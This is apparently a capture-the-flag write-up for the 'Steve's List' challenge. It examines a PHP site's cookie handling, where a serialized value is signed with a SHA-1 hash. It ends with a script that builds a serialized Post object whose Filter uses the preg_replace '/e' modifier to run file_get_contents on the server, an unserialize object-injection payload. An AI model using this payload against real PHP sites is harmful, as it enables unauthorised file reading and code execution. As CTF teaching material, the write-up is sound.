# Steve's List

What a fun challenge! We have a pwned website and we have to figure out how to pwn it as well.

## Recon
Looking at the `steves_list_backup.zip` we see the following files:
```
$ ll steves_list_backup
total 156
drwxr-xr-x 5 tehnerd tehnerd  4096 Oct 25 18:30 ./
drwxrwxr-x 3 tehnerd tehnerd  4096 Nov 12 17:11 ../
-rw-r--r-- 1 tehnerd tehnerd   934 Oct 25 18:28 cookies.php
drwxr-xr-x 2 tehnerd tehnerd  4096 Oct 25 18:28 includes/
-rw-r--r-- 1 tehnerd tehnerd   751 Oct 25 18:28 index.php
drwxr-xr-x 2 tehnerd tehnerd  4096 Oct 25 18:30 posts/
-rw-r--r-- 1 tehnerd tehnerd   371 Oct 25 18:29 root_data.php
-rw-r--r-- 1 tehnerd tehnerd 92413 Oct 25 18:28 Steve.png
drwxr-xr-x 2 tehnerd tehnerd  4096 Oct 25 18:28 templates/
```

The first file to note is `cookies.php`:
```php
  2   if (isset($_COOKIE['custom_settings'])) {
        ...
 16     }
 17   } else {
 18     $custom_settings = array(0 => true);
 19     setcookie('custom_settings', urlencode(serialize(true)), time() + 86    400 * 30, "/");
 20     setcookie('custom_settings_hash', sha1(AUTH_SECRET . serialize(true)    ), time() + 86400 * 30, "/");
 21   }

```
Lines 19 and 20 show that if the cookie `custom_settings` isn't set aka first visit to the website, then two cookies are set: `custom_settings` and `custom_settings_hash`.

This can be verified in Google Chrome via the developer console (`Right Click -> Inspect Element -> 'Console'`)
```
> document.cookie
"custom_settings=b%253A1%253B; custom_settings_hash=2141b332222df459fd212440824a35e63d37ef69"
```

Also, because we have the source code, we know what these values mean:
`custom_settings` - urlencode(serialize(true))


Line 5 of the same file is of key importance to us.

```php
<?php
require_once('steves_list_backup/includes/classes.php');
$filter = [new Filter('/^(.*)/e', 'file_get_contents(\\\'{}\\\')')];

$text = "file_get_contents";
$text = htmlspecialchars($text);

$title = "yay_flag";
$title = htmlspecialchars($title);

$post = new Post($title, $text, $filter);

$post_ser = serialize($post);

$ser = $post_ser;
echo $ser;
?>
```
